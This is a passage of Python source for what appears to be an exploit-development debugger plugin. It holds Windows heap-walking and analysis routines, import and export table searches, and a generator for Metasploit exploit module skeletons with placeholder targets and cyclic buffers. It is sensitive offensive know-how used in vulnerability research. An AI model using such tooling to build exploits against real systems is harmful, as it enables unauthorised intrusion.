						exploitstr += "\t\tsock.put(buffer)\n\n"
						exploitstr += "\t\thandler\n"
					if exploittype == "fileformat":
						exploitstr += "\n\t\tfile_create(buffer)\n\n"						
					if exploittype.find("network") > -1:
						exploitstr += "\t\tdisconnect\n\n"						
						
					exploitstr += "\tend\n"
					if mixin != "":
						dbg.log("Metasploit 'include' section :")
						dbg.log("------------------------------")
						dbg.logLines(mixin)
					dbg.log("Metasploit 'Targets' section :")
					dbg.log("------------------------------")
					dbg.logLines(targetstr.replace("\t","    "))
					dbg.log("")
					dbg.log("Metasploit 'exploit' function :")
					dbg.log("--------------------------------")
					dbg.logLines(exploitstr.replace("\t","    "))
					
					
					#write skeleton
					objexploitfile_seh.write(skeletonheader+"\n",exploitfile_seh)
					objexploitfile_seh.write(skeletoninit+"\n",exploitfile_seh)
					objexploitfile_seh.write(targetstr,exploitfile_seh)
					objexploitfile_seh.write(skeletoninit2,exploitfile_seh)		
					objexploitfile_seh.write(exploitstr,exploitfile_seh)
					objexploitfile_seh.write("end",exploitfile_seh)					
					
				else:
					dbg.log("    Unable to suggest a buffer layout because I couldn't find any good pointers",highlight=1)
			
			return	

		#-----stacks-----#
		def procStacks(args):
			stacks = getStacks()
			if len(stacks) > 0:
				dbg.log("Stacks :")
				dbg.log("--------")
				for threadid in stacks:
					dbg.log("Thread %s : Stack : 0x%s - 0x%s (size : 0x%s)" % (str(threadid),toHex(stacks[threadid][0]),toHex(stacks[threadid][1]),toHex(stacks[threadid][1]-stacks[threadid][0])))
			else:
				dbg.log("No threads/stacks found !",highlight=1)
			return

		#------heapstuff-----#
			
		def procHeap(args):
		
			os = dbg.getOsVersion()
			heapkey = 0

			#first, print list of heaps
			allheaps = []
			try:
				allheaps = dbg.getHeapsAddress()
			except:
				allheaps = []

			dbg.log("Heaps:")
			dbg.log("------")
			if len(allheaps) > 0:
				for heap in allheaps:
					segments = getSegmentList(heap)
					segmentlist = []
					for segment in segments:
						segmentlist.append(segment)
					if not win7mode:
						segmentlist.sort()
					segmentinfo = ""
					for segment in segmentlist:
						segmentinfo = segmentinfo + "0x%08x" % segment + ","
					segmentinfo = segmentinfo.strip(",")
					segmentinfo = " : " + segmentinfo
					defheap = ""
					if heap == getDefaultProcessHeap():
						defheap = "* Default process heap"
					dbg.log("0x%08x (%d segment(s)%s) %s" % (heap,len(segments),segmentinfo,defheap))
			else:
				dbg.log(" ** No heaps found")
			dbg.log("")

			heapbase = 0
			searchtype = ""
			searchtypes = ["lal","freelist","all","segments", "blocks", "layout"]
			error = False
			filterafter = ""
			
			showdata = False
			findvtablesize = True

			minstringlength = 32
			
			if len(allheaps) > 0:
				if "h" in args and type(args["h"]).__name__.lower() != "bool":
					hbase = args["h"].replace("0x","").replace("0X","")
					if not (isAddress(hbase) or hbase.lower() == "default"):
						dbg.log("%s is an invalid address" % args["h"], highlight=1)
						return
					else:
						if hbase.lower() == "default":
							heapbase = getDefaultProcessHeap()
						else:
							heapbase = hexStrToInt(hbase)
			
				if "t" in args:
					if type(args["t"]).__name__.lower() != "bool":
						searchtype = args["t"].lower().replace('"','').replace("'","")
						if not searchtype in searchtypes:
							searchtype = ""
					else:
						searchtype = ""

				if "after" in args:
					if type(args["after"]).__name__.lower() != "bool":
						filterafter = args["after"].replace('"','').replace("'","")
						
				if "v" in args:
					showdata = True

				if "fast" in args:
					findvtablesize = False 
					showdata = False
				
				if searchtype == "" and not "stat" in args:
					dbg.log("Please specify a valid searchtype -t",highlight=1)
					dbg.log("Valid values are :",highlight=1)
					for val in searchtypes:
						dbg.log("   %s" % val,highlight=1)
					error = True
				if "h" in args and heapbase == 0:
					dbg.log("Please specify a valid heap base address -h",highlight=1)
					error = True

				if "size" in args:
					if type(args["size"]).__name__.lower() != "bool":
						size = args["size"].lower()
						if size.startswith("0x"):
							minstringlength = hexStrToInt(size)
						else:
							minstringlength = int(size)
					else:
						dbg.log("Please provide a valid size -size",highlight=1)
						error = True

				if "clearcache" in args:
					dbg.forgetKnowledge("vtableCache")
					dbg.log("[+] vtableCache cleared.")
			
			else:
				dbg.log("No heaps found",highlight=1)
				return
			
			heap_to_query = []
			heapfound = False
			
			if "h" in args:
				for heap in allheaps:
					if heapbase == heap:
						heapfound = True
						heap_to_query = [heapbase]
				if not heapfound:
					error = True
					dbg.log("0x%08x is not a valid heap base address" % heapbase,highlight=1)
			else:
				#show all heaps
				for heap in allheaps:
					heap_to_query.append(heap)
			
			if error:
				return
			else:
				statinfo = {}
				logfile_b = ""
				thislog_b = ""
				logfile_l = ""
				logfile_l = ""

				if searchtype == "blocks" or searchtype == "all":
					logfile_b = MnLog("heapblocks.txt")
					thislog_b = logfile_b.reset()

				if searchtype == "layout" or searchtype == "all":
					logfile_l = MnLog("heaplayout.txt")
					thislog_l = logfile_l.reset()

				for heapbase in heap_to_query:
					if win7mode:
						# get key, if any
						heapkey = struct.unpack('<L',dbg.readMemory(heapbase+0x50,4))[0]
					dbg.log("")
					dbg.log("[+] Processing heap 0x%08x" % heapbase)
					if searchtype == "lal" or searchtype == "all":
						lalindex = 0
						dbg.log("[+] Getting LookAsideList for heap 0x%08x" % heapbase)
						# do we have a LAL for this heap ?
						FrontEndHeap = struct.unpack('<L',dbg.readMemory(heapbase + 0x580,4))[0]
						if FrontEndHeap > 0:
							listcnt = 0
							startloc = FrontEndHeap
							while lalindex < 128:
								thisptr = FrontEndHeap + (0x30 * lalindex)
								chunkptr = 0
								try:
									chunkptr = struct.unpack('<L',dbg.readMemory(thisptr,4))[0]
								except:
									dbg.log(" - Unable to read memory at 0x%s (LAL[%d])" % (thisptr,lalindex),highlight=1)
								chunksize = 0
								if chunkptr != 0:
									thissize = (lalindex * 8)
									dbg.log("     %s" % ("-" * 70))
									dbg.log("[%d] : 0x%s (chunk size : %d+%d=%d)" % (lalindex,toHex(thisptr),thissize,8,thissize+8))
									chunksize = thissize
								while chunkptr != 0 and chunkptr != startloc:
									if chunkptr != 0:
										chsize1 = dbg.readMemory(chunkptr-8,1)
										chsize2 = dbg.readMemory(chunkptr-7,1)
										hexstr = bin2hexstr(chsize2 + chsize1).replace("\\x","")
										if len(hexstr) == 0:
											hexstr = "00"
										hexval = hexStrToInt(hexstr) * 8	# size is in blocks
										data = ""
										if showdata:
											data = dbg.readMemory(chunkptr+12,16)
											data = " | " + bin2hex(data).replace('\n','') 
										dbg.log("     Chunk : 0x%s, FLINK at 0x%s (%d)%s" % (toHex(chunkptr-8),toHex(chunkptr),hexval,data),address=chunkptr-8)
										if chunksize != hexval and lalindex > 0:
											dbg.log("   ** self.Size field of chunk at 0x%s may have been overwritten, it contains %d and should have been %d !" % (toHex(chunkptr-8),hexval,chunksize),highlight=1)
									try:
										chunkptr = struct.unpack('<L',dbg.readMemory(chunkptr,4))[0]
									except:
										chunkptr = 0
									listcnt += 1
								lalindex += 1
							dbg.log("[+] Done. Nr of LAL lists : %d" % listcnt)
							dbg.log("")
						else:
							dbg.log("[+] No LookAsideList found for this heap")
							dbg.log("")
						
					if searchtype == "freelist" or searchtype == "all":
						flindex = 0
						dbg.log("[+] Getting FreeLists for heap 0x%s" % heapbase)
						listcnt = 0
						while flindex < 128:
							freelistflink = hexStrToInt(heapbase) + 0x178 + (8 * flindex) + 4
							freelistblink = hexStrToInt(heapbase) + 0x178 + (8 * flindex) 
							try:
								tblink = struct.unpack('<L',dbg.readMemory(freelistflink,4))[0]
								tflink = struct.unpack('<L',dbg.readMemory(freelistblink,4))[0]
								#dbg.log("freelistblink : 0x%s, tblink : 0x%s" % (toHex(freelistblink),toHex(tblink)))
								origblink = freelistblink
								if freelistblink != tblink:
									expectedsize = ">1016"
									if flindex != 0:
										expectedsize = str(8 * flindex)
									space = len(str(flindex))
									dbg.log("     %s" % ("-" * 80))
									dbg.log("    [%s] - FreeLists[%d] at 0x%s - 0x%s | Expected chunk size : %s" % (flindex,flindex,toHex(freelistblink),toHex(freelistflink),expectedsize))
									dbg.log("         %s[FreeLists[%d].flink : 0x%s | FreeLists[%d].blink : 0x%s]" % (" " * space,flindex,toHex(tflink),flindex,toHex(tblink)))
									endchain = False
									while not endchain:
										thisblink = struct.unpack('<L',dbg.readMemory(tflink+4,4))[0]
										thisflink = struct.unpack('<L',dbg.readMemory(tflink,4))[0]
										chsize1 = dbg.readMemory(tflink-8,1)
										chsize2 = dbg.readMemory(tflink-7,1)
										hexstr = bin2hexstr(chsize2 + chsize1).replace("\\x","")
										hexval = hexStrToInt(hexstr) * 8	# size is in blocks						
										data = ""
										if showdata:
											data = dbg.readMemory(thisblink+16,16)
											data = " | " + bin2hex(data).replace('\n','') 
										dbg.log("           * Chunk : 0x%s [flink : 0x%s | blink : 0x%s] (ChunkSize : %d - 0x%s | UserSize : 0x%s)%s" % (toHex(tflink),toHex(thisflink),toHex(thisblink),hexval,toHex(hexval),toHex(hexval-8),data),address=tflink)										
										tflink=thisflink
										if tflink == origblink:
											endchain = True
							except:
								dbg.log(" - Unable to read memory at 0x%s (FreeLists[%d])" % (freelistflink,flindex),highlight=1)
							flindex += 1

					if searchtype == "layout" or searchtype == "all":
						segments = getSegmentsForHeap(heapbase)
						sortedsegments = []
						global vtableCache
						# read vtableCache from knowledge
						vtableCache = dbg.getKnowledge("vtableCache")
						if vtableCache is None:
							vtableCache = {}

						for seg in segments:
							sortedsegments.append(seg)
						if not win7mode:
							sortedsegments.sort()
						segmentcnt = 0
						minstringlen = minstringlength
						blockmem = []
						nr_filter_matches = 0
						for seg in sortedsegments:
							segmentcnt += 1
							segstart = segments[seg][0]
							segend = segments[seg][1]
							FirstEntry = segments[seg][2]
							LastValidEntry = segments[seg][3]								
							segblocks = walkSegment(FirstEntry,LastValidEntry,heapkey)
							sortedblocks = []
							for block in segblocks:
								sortedblocks.append(block)
							sortedblocks.sort()
							# for each block, try to get info
							# object ?
							# BSTR ?
							# str ?
							logfile_l.write(" ",thislog_l)
							tolog = "----- Heap 0x%08x, Segment 0x%08x - 0x%08x (%d/%d) -----" % (heapbase,segstart,segend,segmentcnt,len(sortedsegments))
							dbg.log(tolog)
							logfile_l.write(tolog,thislog_l)
							for block in sortedblocks:
								showinlog = False
								thisblock = segblocks[block]
								unused = thisblock[3]
								blocksize =thisblock[1]*8 
								usersize = blocksize - unused
								headersize = thisblock[4]
								userptr = block + headersize
								flags = getHeapFlag(thisblock[2])								
								# read block into memory
								blockmem = dbg.readMemory(block,blocksize)

								# first, find all strings (ascii, unicode and BSTR)
								asciistrings = {}
								unicodestrings = {}
								bstr = {}
								objects = {}
								cnt = headersize
								asciistring = ""
								asciibegin = block + headersize
								while cnt < blocksize:
									thismembyte = blockmem[cnt]
									if isAscii2(ord(thismembyte)):
										asciistring += thismembyte
									else:
										if blockmem[cnt] == "\x00":
											# end of string perhaps ?
											if asciistring != "" and len(asciistring) >= minstringlen:
												asciistrings[asciibegin] = asciistring
											asciibegin = block + cnt + 1
											asciistring = ""
										else:
											asciistring = ""
											asciibegin += 1
									cnt += 1

								# unicode
								cnt = headersize
								unicodebegin = block+headersize
								unicodestring = ""
								while cnt < blocksize-1:
									if isAscii2(ord(blockmem[cnt])) and blockmem[cnt+1] == "\x00": 
										unicodestring += blockmem[cnt]
										cnt += 1
									else:
										if blockmem[cnt] == "\x00" and blockmem[cnt+1] == "\x00":
											if unicodestring != "" and len(unicodestring) >= minstringlen:
												unicodestrings[unicodebegin] = unicodestring
											unicodestring = ""
											unicodebegin = block + cnt + 2
											cnt += 1
										else:
											unicodestring = ""
											unicodebegin += 1									
									cnt += 1

								# check each unicode, maybe it's a BSTR
								tomove = []
								for unicodeptr in unicodestrings:
									delta = unicodeptr - block
									size = len(unicodestrings[unicodeptr])
									if delta >= 4:
										maybesize = struct.unpack('<L',blockmem[delta-4:delta])[0]
										if maybesize == (size*2):
											tomove.append(unicodeptr)
											bstr[unicodeptr] = unicodestrings[unicodeptr]
								for todel in tomove:
									del unicodestrings[todel]

								# get objects too
								# find all unique objects
								objects = {}
								orderedobj = []
								if __DEBUGGERAPP__ == "WinDBG":
									nrlines = int(float(blocksize) / 4)
									cmd2run = "dds 0x%08x L 0x%x" % ((block + headersize),nrlines)
									output = dbg.nativeCommand(cmd2run)
									outputlines = output.split("\n")
									for line in outputlines:
										if line.find("::") > -1 and line.find("vftable") > -1:
											parts = line.split(" ")
											objconstr = ""
											if len(parts) > 3:
												objectptr = hexStrToInt(parts[0])
												cnt = 2
												objectinfo = ""
												while cnt < len(parts):
													objectinfo += parts[cnt] + " "
													cnt += 1
												parts2 = line.split("::")
												parts2name = ""
												pcnt = 0
												while pcnt < len(parts2)-1:
													parts2name = parts2name + "::" + parts2[pcnt]
													pcnt += 1
												parts3 = parts2name.split(" ")
												if len(parts3) > 3:
													objconstr = parts3[3]
												if not objectptr in objects:
													objects[objectptr] = [objectinfo,objconstr]
												objsize = 0
												if findvtablesize:
													if not objconstr in vtableCache:
														cmd2run = "u %s::CreateElement L 8" % objconstr
														objoutput = dbg.nativeCommand(cmd2run)
														if "HeapAlloc" in objoutput:
															objlines = objoutput.split("\n")
															lineindex = 0
															for objline in objlines:
																if "HeapAlloc" in objline:
																	if lineindex >= 3:
																		sizeline = objlines[lineindex-3]
																		if "push" in sizeline:
																			sizelineparts = sizeline.split("push")
																			if len(sizelineparts) > 1:
																				sizevalue = sizelineparts[len(sizelineparts)-1].replace(" ","").replace("h","")
																				try:
																					objsize = hexStrToInt(sizevalue)
																				except:
																					#print traceback.format_exc()
																					objsize = 0
																			break
																lineindex += 1
														vtableCache[objconstr] = objsize
													else:
														objsize = vtableCache[objconstr]

								# remove object entries that belong to the same object
								allobjects = []
								objectstodelete = []
								for optr in objects:
									allobjects.append(optr)
								allobjects.sort()
								skipuntil = 0
								for optr in allobjects:
									if optr < skipuntil:
										objectstodelete.append(optr)
									else:
										objname = objects[optr][1]
										objsize = 0
										try:
											objsize = vtableCache[objname]
										except:
											objsize = 0
										skipuntil = optr + objsize
								# remove vtable lines that are too close to each other
								minvtabledistance = 0x0c
								prevvname = ""
								prevptr = 0
								thisvname = ""
								for optr in allobjects:
									thisvname = objects[optr][1]
									if thisvname == prevvname and (optr - prevptr) <= minvtabledistance:
										if not optr in objectstodelete:
											objectstodelete.append(optr)
									else:
										prevptr = optr
										prevvname = thisvname


								for vtableptr in objectstodelete:
									del objects[vtableptr]

								for obj in objects:
									orderedobj.append(obj)

								for ascstring in asciistrings:
									orderedobj.append(ascstring)

								for unicodestring in unicodestrings:
									orderedobj.append(unicodestring)

								for bstrobj in bstr:
									orderedobj.append(bstrobj)

								orderedobj.sort()

								# print out details for this block
								tolog = "Block 0x%08x (Usersize 0x%x, Blocksize 0x%x) : %s" % (block,usersize,usersize+unused,flags)
								if showdata:
									dbg.log(tolog)
								logfile_l.write(tolog,thislog_l)

								previousptr = block
								previoussize = 0
								showinlog = False
								for ptr in orderedobj:
									ptrtype = ""
									ptrinfo = ""
									data = ""
									alldata = ""
									blockinfo = ""
									ptrbytes = 0
									endptr = 0
									datasize = 0
									ptrchars = 0
									infoptr = ptr
									endptr = 0
									if ptr in asciistrings:
										ptrtype = "String"
										data = asciistrings[ptr]
										alldata = data
										ptrbytes = len(data)
										ptrchars = ptrbytes
										datasize = ptrbytes
										if ptrchars > 100:
											data = data[0:100]+"..."
										blockinfo = "%s (Data : 0x%x/%d bytes, 0x%x/%d chars) : %s" % (ptrtype,ptrbytes,ptrbytes,ptrchars,ptrchars,data)
										infoptr = ptr
										endptr = infoptr + ptrchars + 1
									elif ptr in bstr:
										ptrtype = "BSTR"
										data = bstr[ptr]
										alldata = data
										ptrchars = len(data)
										ptrbytes = (ptrchars*2)
										datasize = ptrbytes+6
										infoptr = infoptr - 4
										if ptrchars > 100:
											data = data[0:100]+"..."
										blockinfo = "%s 0x%x/%d bytes (Data : 0x%x/%d bytes, 0x%x/%d chars) : %s" % (ptrtype,ptrbytes+6,ptrbytes+6,ptrbytes,ptrbytes,ptrchars,ptrchars,data)
										endptr = infoptr + ptrbytes + 6
									elif ptr in unicodestrings:
										ptrtype = "Unicode"
										data = unicodestrings[ptr]
										alldata = ""
										ptrchars = len(data)
										ptrbytes = ptrchars * 2
										datasize = ptrbytes
										if ptrchars > 100:
											data = data[0:100]+"..."
										blockinfo = "%s (0x%x/%d bytes, 0x%x/%d chars) : %s" % (ptrtype,ptrbytes,ptrbytes,ptrchars,ptrchars,data)
										endptr = infoptr + ptrbytes + 2
									elif ptr in objects:
										ptrtype = "Object"
										data = objects[ptr][0]
										vtablename = objects[ptr][1]
										datasize = 0
										if vtablename in vtableCache:
											datasize = vtableCache[vtablename]
										alldata = data
										if datasize > 0:
											blockinfo = "%s (0x%x bytes): %s" % (ptrtype,datasize,data)
										else:
											blockinfo = "%s : %s" % (ptrtype,data)
										endptr = ptr + datasize

									# calculate delta
									slackspace = infoptr - previousptr
									if endptr > 0 and not ptrtype=="Object":
										if slackspace >= 0:
											tolog = "  +%04x @ %08x->%08x : %s" % (slackspace,infoptr,endptr,blockinfo)
										else:
											tolog = "       @ %08x->%08x : %s" % (infoptr,endptr,blockinfo)
									else:
										if slackspace >= 0:
											if endptr != infoptr:
												tolog = "  +%04x @ %08x->%08x : %s" % (slackspace,infoptr,endptr,blockinfo)
											else:
												tolog = "  +%04x @ %08x           : %s" % (slackspace,infoptr,blockinfo)
										else:
											tolog = "        @ %08x           : %s" % (infoptr,blockinfo)

									if filterafter == "" or (filterafter != "" and filterafter in alldata):
										showinlog = True  # keep this for the entire block
										if (filterafter != ""):
											nr_filter_matches += 1
									if showinlog:
										if showdata:
											dbg.log(tolog)
										logfile_l.write(tolog,thislog_l)
									
									previousptr = endptr
									previoussize = datasize
						# save vtableCache again
						if filterafter != "":
							tolog = "Nr of filter matches: %d" % nr_filter_matches
							if showdata:
								dbg.log("")
								dbg.log(tolog)
							logfile_l.write("",thislog_l)
							logfile_l.write(tolog,thislog_l)
						dbg.addKnowledge("vtableCache",vtableCache)


					if searchtype == "segments" or searchtype == "all" or searchtype == "blocks" or "stat" in args:
						segments = getSegmentsForHeap(heapbase)
						dbg.log("Segment List for heap 0x%08x:" % heapbase)
						dbg.log("---------------------------------")
						sortedsegments = []
						for seg in segments:
							sortedsegments.append(seg)
						if not win7mode:
							sortedsegments.sort()
						for seg in sortedsegments:
							# 0 : segmentstart
							# 1 : segmentend
							# 2 : firstentry
							# 3 : lastentry
							segstart = segments[seg][0]
							segend = segments[seg][1]
							FirstEntry = segments[seg][2]
							LastValidEntry = segments[seg][3]
							tolog = "Heap : 0x%08x : Segment 0x%08x - 0x%08x (FirstEntry: 0x%08x - LastValidEntry: 0x%08x)" % (heapbase, segstart,segend,FirstEntry,LastValidEntry)					
							dbg.log(tolog)
							if searchtype == "blocks" or "stat" in args:
								try:
									logfile_b.write(tolog,thislog_b)
								except:
									pass
								segblocks = walkSegment(FirstEntry,LastValidEntry,heapkey)
								tolog = "    Nr of blocks : %d " % len(segblocks)
								dbg.log(tolog)
								try:
									logfile_b.write(tolog,thislog_b)
								except:
									pass
								tolog = "    _HEAP_ENTRY  psize   size  unused  UserPtr   UserSize"
								dbg.log(tolog)
								try:
									logfile_b.write(tolog,thislog_b)
								except:
									pass
								sortedblocks = []
								for block in segblocks:
									sortedblocks.append(block)
								sortedblocks.sort()
								nextblock = 0
								segstatinfo = {}
								for b in sortedblocks:
									block = b
									# 0 prevsize
									# 1 thissize
									# 2 flag
									# 3 unused
									# 4 headersize
									# 5 psize
									flagtxt = getHeapFlag(segblocks[block][2])
									unused = segblocks[block][3]
									selfsize = segblocks[block][1]*8
									usersize = selfsize - unused
									psize = segblocks[block][5]
									headersize = segblocks[block][4]
									nextblock = block + headersize + usersize + unused 
									if not "stat" in args:
										tolog = "       %08x  %05x  %05x   %05x  %08x  %08x (%d) (%s)" % (block,psize,selfsize,unused,block+headersize,usersize,usersize,flagtxt)
										dbg.log(tolog)
										logfile_b.write(tolog,thislog_b)
									else:
										if not usersize in segstatinfo:
											segstatinfo[usersize] = 1
										else: 
											segstatinfo[usersize] += 1
								
								if nextblock > 0 and nextblock < LastValidEntry:
									if not "stat" in args:
										nextblock -= headersize
										tolog = "    0x%08x - 0x%08x (end of segment) : uncommitted " % (nextblock,LastValidEntry)
										dbg.log(tolog)
										logfile_b.write(tolog,thislog_b)
								if "stat" in args:
									statinfo[segstart] = segstatinfo
									# show statistics
									orderedsizes = []
									totalalloc = 0
									for thissize in segstatinfo:
										orderedsizes.append(thissize)
										totalalloc += segstatinfo[thissize] 
									orderedsizes.sort(reverse=True)
									tolog = "    Segment Statistics:"
									dbg.log(tolog)
									try:
										logfile_b.write(tolog,thislog_b)
									except:
										pass
									for thissize in orderedsizes:
										nrblocks = segstatinfo[thissize]
										percentage = (float(nrblocks) / float(totalalloc)) * 100
										tolog = "    Size : 0x%x (%d) : %d blocks (%.2f %%)" % (thissize,thissize,nrblocks,percentage)

										dbg.log(tolog)
										try:
											logfile_b.write(tolog,thislog_b)
										except:
											pass
									tolog = "    Total blocks : %d" % totalalloc
									dbg.log(tolog)
									try:
										logfile_b.write(tolog,thislog_b)
									except:
										pass
									tolog = ""
									try:
										logfile_b.write(tolog,thislog_b)
									except:
										pass
									dbg.log("")
								dbg.log("")
				if "stat" in args and len(statinfo) > 0:
					tolog = "Global statistics"
					dbg.log(tolog)
					try:
						logfile_b.write(tolog,thislog_b)
					except:
						pass
					globalstats = {}
					allalloc = 0
					for seginfo in statinfo:
						segmentstats = statinfo[seginfo]
						for size in segmentstats:
							allalloc += segmentstats[size]
							if not size in globalstats:
								globalstats[size] = segmentstats[size]
							else:
								globalstats[size] += segmentstats[size]
					orderedstats = []
					for size in globalstats:
						orderedstats.append(size)
					orderedstats.sort(reverse=True)
					for thissize in orderedstats:
						nrblocks = globalstats[thissize]
						percentage = (float(nrblocks) / float(allalloc)) * 100
						tolog = "  Size : 0x%x (%d) : %d blocks (%.2f %%)" % (thissize,thissize,nrblocks,percentage)
						dbg.log(tolog)
						try:
							logfile_b.write(tolog,thislog_b)
						except:
							pass
					tolog = "  Total blocks : %d" % allalloc
					dbg.log(tolog)
					try:
						logfile_b.write(tolog,thislog_b)
					except:
						pass
			#dbg.log("%s" % "*" * 90)					
					
			return
		
		def procGetIAT(args):
			return procGetxAT(args,"iat")

		def procGetEAT(args):
			return procGetxAT(args,"eat")

		
		def procGetxAT(args,mode):
		
			keywords = []
			keywordstring = ""
			modulecriteria = {}
			criteria = {}

			thisxat = {}
			
			if "s" in args:
				if type(args["s"]).__name__.lower() != "bool":
					keywordstring = args["s"].replace("'","").replace('"','')
					keywords = keywordstring.split(",")
			
			modulecriteria,criteria = args2criteria(args,modulecriteria,criteria)
			
			modulestosearch = getModulesToQuery(modulecriteria)
			if not silent:
				dbg.log("[+] Querying %d modules" % len(modulestosearch))
			
			if len(modulestosearch) > 0:
			
				xatfilename="%ssearch.txt" % mode
				objxatfilename = MnLog(xatfilename)
				xatfile = objxatfilename.reset()
			
				for thismodule in modulestosearch:
					thismod = MnModule(thismodule) 
					if mode == "iat":
						thisxat = thismod.getIAT()
					else:
						thisxat = thismod.getEAT()

					thismodule = thismod.getShortName()

					for thisfunc in thisxat:
						thisfuncname = thisxat[thisfunc].lower()
						origfuncname = thisfuncname
						firstindex = thisfuncname.find(".")
						if firstindex > 0:
							thisfuncname = thisfuncname[firstindex+1:len(thisfuncname)]
						addtolist = False
						if len(keywords) > 0:
							for keyword in keywords:
								keyword = keyword.lower().strip()
								if ((keyword.startswith("*") and keyword.endswith("*")) or keyword.find("*") < 0):
									keyword = keyword.replace("*","")
									if thisfuncname.find(keyword) > -1:
										addtolist = True
								if keyword.startswith("*") and not keyword.endswith("*"):
									keyword = keyword.replace("*","")
									if thisfuncname.endswith(keyword):
										addtolist = True
								if keyword.endswith("*") and not keyword.startswith("*"):
									keyword = keyword.replace("*","")
									if thisfuncname.startswith(keyword):
										addtolist = True
						else:
							addtolist = True
						if addtolist:
							if mode == "iat":
								theptr = struct.unpack('<L',dbg.readMemory(thisfunc,4))[0]
								thedelta = thisfunc - thismod.moduleBase
								logentry = "At 0x%s in %s (base + 0x%s) : 0x%s (ptr to %s)" % (toHex(thisfunc),thismodule.lower(),toHex(thedelta),toHex(theptr),origfuncname)
							else:
								logentry = "0x%08x : %s!%s" % (thisfunc,thismodule.lower(),origfuncname)
							dbg.log(logentry,address = thisfunc)
							objxatfilename.write(logentry,xatfile)
			return

			
		#-----Metasploit module skeleton-----#
		def procSkeleton(args):
		
			cyclicsize = 5000
			if "c" in args:
				if type(args["c"]).__name__.lower() != "bool":
					try:
						cyclicsize = int(args["c"])
					except:
						cyclicsize = 5000

			exploittype = ""
			skeletonarg = ""
			usecliargs = False
			validstypes ={}
			validstypes["tcpclient"] = "network client (tcp)"
			validstypes["udpclient"] = "network client (udp)"
			validstypes["fileformat"] = "fileformat"
			exploittypes = [ "fileformat","network client (tcp)","network client (udp)" ]
			errorfound = False
			if __DEBUGGERAPP__ == "WinDBG" or "t" in args:
				if "t" in args:
					if type(args["t"]).__name__.lower() != "bool":
						skeltype = args["t"].lower()
						skelparts = skeltype.split(":")
						if skelparts[0] in validstypes:
							exploittype = validstypes[skelparts[0]]
							if len(skelparts) > 1:
								skeletonarg = skelparts[1]
							else:
								errorfound = True
							usecliargs = True
						else:
							errorfound = True
					else:
						errorfound = True
				else:
					errorfound = True
			# ask for type of module
			else:
				dbg.log(" ** Please select a skeleton exploit type from the dropdown list **",highlight=1)
				exploittype = dbg.comboBox("Select msf exploit skeleton to build :", exploittypes).lower().strip()

			if errorfound:
				dbg.log(" ** Please specify a valid skeleton type and argument **",highlight=1)
				dbg.log("    Valid types are : tcpclient:argument, udpclient:argument, fileformat:argument")
				dbg.log("    Example : skeleton for a pdf file format exploit: -t fileformat:pdf")
				dbg.log("              skeleton for tcp client against port 123: -t tcpclient:123")
				return
			if not exploittype in exploittypes:
				dbg.log("Boo - invalid exploit type, try again !",highlight=1)
				return
				
			portnr = 0
			extension = ""
			if exploittype.find("network") > -1:
				if usecliargs:
					portnr = skeletonarg
				else:
					portnr = dbg.inputBox("Remote port number : ")
				try:
					portnr = int(portnr)
				except:
					portnr = 0




			if exploittype.find("fileformat") > -1:
				if usecliargs:
					extension = skeletonarg
				else:
					extension = dbg.inputBox("File extension :")
			
			extension = extension.replace("'","").replace('"',"").replace("\n","").replace("\r","")
			
			if not extension.startswith("."):
				extension = "." + extension			
			
			exploitfilename="msfskeleton.rb"
			objexploitfile = MnLog(exploitfilename)
			global ignoremodules
			global noheader
			noheader = True
			ignoremodules = True
			exploitfile = objexploitfile.reset()			
			ignoremodules = False
			noheader = False

			modulecriteria = {}
			criteria = {}
			
			modulecriteria,criteria = args2criteria(args,modulecriteria,criteria)
			
			badchars = ""
			if "badchars" in criteria:
				badchars = criteria["badchars"]
				
			if "nonull" in criteria:
				if not '\x00' in badchars:
					badchars += '\x00'			
			
			skeletonheader,skeletoninit,skeletoninit2 = getSkeletonHeader(exploittype,portnr,extension,"",badchars)
			
			targetstr = "\t\t\t'Targets'\t\t=>\n"
			targetstr += "\t\t\t\t[\n"
			targetstr += "\t\t\t\t\t[ '<fill in the OS/app version here>',\n"
			targetstr += "\t\t\t\t\t\t{\n"
			targetstr += "\t\t\t\t\t\t\t'Ret'   \t=>\t0x00000000,\n"
			targetstr += "\t\t\t\t\t\t\t'Offset'\t=>\t0\n"
			targetstr += "\t\t\t\t\t\t}\n"
			targetstr += "\t\t\t\t\t],\n"
			targetstr += "\t\t\t\t],\n"
			
			exploitstr = "\tdef exploit\n\n"
			if exploittype.find("network") > -1:
				if exploittype.find("tcp") > -1:
					exploitstr += "\n\t\tconnect\n\n"
				elif exploittype.find("udp") > -1:
					exploitstr += "\n\t\tconnect_udp\n\n"
			
			exploitstr += "\t\tbuffer = Rex::Text.pattern_create(" + str(cyclicsize) + ")\n"
			
			if exploittype.find("network") > -1:
				exploitstr += "\n\t\tprint_status(\"Trying target #{target.name}...\")\n"	
				if exploittype.find("tcp") > -1:
					exploitstr += "\t\tsock.put(buffer)\n"
					exploitstr += "\n\t\thandler\n"
				elif exploittype.find("udp") > -1:
					exploitstr += "\t\tudp_sock.put(buffer)\n"
					exploitstr += "\n\t\thandler(udp_sock)\n"			
			if exploittype == "fileformat":
				exploitstr += "\n\t\tfile_create(buffer)\n\n"						
			if exploittype.find("network") > -1:
				exploitstr += "\t\tdisconnect\n\n"						
				
			exploitstr += "\tend\n"				
			
			objexploitfile.write(skeletonheader+"\n",exploitfile)
			objexploitfile.write(skeletoninit+"\n",exploitfile)
			objexploitfile.write(targetstr,exploitfile)
			objexploitfile.write(skeletoninit2,exploitfile)		
			objexploitfile.write(exploitstr,exploitfile)
			objexploitfile.write("end",exploitfile)	
			
			
			return


		def procFillChunk(args):
		
			reference = ""
			fillchar = "A"
			allregs = dbg.getRegs()
			origreference = ""

			deref = False
			refreg = ""
			offset = 0
			signstuff = 1
			customsize = 0

			if "s" in args:
				if type(args["s"]).__name__.lower() != "bool":
					sizearg = args["s"]
					if sizearg.lower().startswith("0x"):
						sizearg = sizearg.lower().replace("0x","")
						customsize = int(sizearg,16)
					else:
						customsize = int(sizearg)

			if "r" in args:
				if type(args["r"]).__name__.lower() != "bool":

					# break into pieces
					reference = args["r"].upper()
					origreference = reference
					if reference.find("[") > -1 and reference.find("]") > -1:
						refregtmp = reference.replace("[","").replace("]","").replace(" ","")
						if reference.find("+") > -1 or reference.find("-") > -1:
							# deref with offset
							refregtmpparts = []
							if reference.find("+") > -1:
								refregtmpparts = refregtmp.split("+")
								signstuff = 1
							if reference.find("-") > -1:
								refregtmpparts = refregtmp.split("-")
								signstuff = -1
							if len(refregtmpparts) > 1:
								offset = int(refregtmpparts[1].replace("0X",""),16) * signstuff
								deref = True
